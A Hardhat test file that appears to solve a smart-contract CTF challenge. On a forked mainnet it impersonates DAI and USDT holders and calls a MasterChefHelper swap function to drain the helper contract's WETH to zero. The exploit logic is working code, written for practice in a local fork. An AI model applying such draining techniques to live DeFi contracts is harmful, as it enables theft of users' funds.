const { ethers, upgrades } = require('hardhat');
const { expect } = require('chai');
require("../util");

describe('[Challenge] resucue', function () {
    let deployer, proposer, sweeper, attacker;

    before(async function () {
        // Prepare

        const SetupDeploy = await ethers.getContractFactory("Setup");
        setup = await SetupDeploy.deploy({value: ethers.utils.parseEther("10")});
        setup.deployed();

        console.log("Setup deployed to:", setup.address);

        setupAddress = setup.address
        wethAddres = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"
        daiAddress = "0x6B175474E89094C44Da98b954EedeAC495271d0F"
        usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"

        weth = await ethers.getContractAt("MockERC20", wethAddres)
        dai = await ethers.getContractAt("MockERC20", daiAddress)
        usdt = await ethers.getContractAt("MockERC20", usdtAddress)

        mcHelperAddress = await setup.mcHelper()
        mcHelper = await ethers.getContractAt("MasterChefHelper", mcHelperAddress)
        balance = await weth.balanceOf(mcHelperAddress)

        console.log("Before Attack, setup contract balance >>>  ", balance)
    });

    it('Exploit', async function () {        
        /** CODE YOUR EXPLOIT HERE */

        // Send worth 10WETH DAI to setup contract
        // Assume 1WEWTH = 2000 DAI
        daiHolder = "0x16b34ce9a6a6f7fc2dd25ba59bf7308e7b38e186"
        await startMockAccount([daiHolder]);
        daiHolderAccount = await ethers.getSigner(daiHolder);
        await dai.connect(daiHolderAccount).transfer(mcHelperAddress, ethers.utils.parseEther("20000"))
        console.log("Check setup dai balance >>>  ", await dai.balanceOf(mcHelperAddress) )

        // Send USDT ETH
        usdtHolder = "0x5041ed759dd4afc3a72b8192c143f72f4724081a";
        await startMockAccount([usdtHolder]);
        usdtHolderAccount = await ethers.getSigner(usdtHolder);

        // solve
        DAI_WETH_Poolid = 2
        AmountIn = ethers.utils.parseUnits("10", 6);
        minAmountOut = 0;
        console.log("Check mcHelperAddress usdt balance >>>  ", await usdt.balanceOf(mcHelperAddress) )
        await usdt.connect(usdtHolderAccount).approve(mcHelperAddress, AmountIn);
        console.log("prepare swapTokens Pool Token")

        await mcHelper.connect(usdtHolderAccount).swapTokenForPoolToken(2, usdtAddress, AmountIn, minAmountOut);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        console.log(  "weth balance >>>> ", await weth.balanceOf(mcHelperAddress));
        expect(await weth.balanceOf(mcHelperAddress)).to.eq('0');
    });
});